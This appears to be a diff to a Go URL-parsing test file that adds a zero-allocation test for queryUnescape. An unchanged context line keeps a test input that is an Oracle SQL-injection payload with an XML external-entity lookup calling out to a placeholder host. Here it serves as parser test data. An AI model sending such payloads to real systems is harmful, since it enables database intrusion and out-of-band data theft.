@@ -4,8 +4,11 @@
 package url
 
 import (
+	"strings"
 	"testing"
 )
+
+var queryUnescapeResult string
 
 var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`
 
@@ -39,6 +42,19 @@ func TestQueryUnescape(t *testing.T) {
 		if out := queryUnescape(k); out != v {
 			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
 		}
+	}
+}
+
+func TestQueryUnescapeWithoutMarkersDoesNotAllocate(t *testing.T) {
+	input := strings.Repeat("x", 64<<10)
+	allocations := testing.AllocsPerRun(100, func() {
+		queryUnescapeResult = queryUnescape(input)
+	})
+	if allocations != 0 {
+		t.Fatalf("expected no allocations, have %.0f", allocations)
+	}
+	if queryUnescapeResult != input {
+		t.Fatal("unescaped input changed")
 	}
 }
 
